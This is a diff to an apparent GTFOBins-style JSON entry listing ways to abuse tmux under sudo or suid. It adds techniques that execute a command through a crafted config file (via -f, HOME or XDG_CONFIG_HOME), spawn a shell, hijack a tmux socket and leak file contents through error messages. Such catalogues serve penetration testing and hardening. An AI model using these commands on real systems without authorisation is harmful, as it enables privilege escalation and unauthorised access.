@@ -1,25 +1,71 @@
 {
   "functions": {
+    "command": [
+      {
+        "blind": true,
+        "code": "echo 'run-shell \"/path/to/command\"' >/path/to/temp-file.conf\ntmux -f /path/to/temp-file.conf",
+        "contexts": {
+          "sudo": null,
+          "suid": {
+            "shell": true
+          }
+        }
+      },
+      {
+        "blind": true,
+        "code": "mkdir -p /path/to/temp-dir\necho 'run-shell \"/path/to/command\"' >/path/to/temp-dir/.tmux.conf\nHOME=/path/to/temp-dir tmux",
+        "comment": "If the `HOME` directory is already writable, the file can be placed directly as `~/.tmux.conf` without overriding `HOME`. The `HOME` environment variable must be passed to the privileged process.",
+        "contexts": {
+          "sudo": null,
+          "suid": {
+            "shell": true
+          }
+        }
+      },
+      {
+        "blind": true,
+        "code": "mkdir -p /path/to/temp-dir/tmux\necho 'run-shell \"/path/to/command\"' >/path/to/temp-dir/tmux/tmux.conf\nXDG_CONFIG_HOME=/path/to/temp-dir tmux",
+        "comment": "The `XDG_CONFIG_HOME` environment variable must be passed to the privileged process.",
+        "contexts": {
+          "sudo": null,
+          "suid": {
+            "shell": true
+          }
+        }
+      }
+    ],
     "file-read": [
       {
-        "description": "The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",
-        "code": "LFILE=file_to_read\ntmux -f $LFILE\n"
+        "binary": false,
+        "code": "tmux -f /path/to/input-file",
+        "comment": "The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       }
     ],
     "shell": [
       {
-        
-        "code": "tmux\n"
+        "code": "tmux -c /bin/sh",
+        "contexts": {
+          "sudo": null,
+          "suid": {
+            "shell": true
+          },
+          "unprivileged": null
+        }
       },
       {
-        "description": "Provided to have enough permissions to access the socket.",
-        "code": "tmux -S /path/to/socket_name\n"
-      }
-    ],
-    "sudo": [
-      {
-        
-        "code": "sudo tmux\n"
+        "code": "tmux -S /path/to/socket",
+        "comment": "Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        },
+        "version": "< 3.3"
       }
     ]
   }
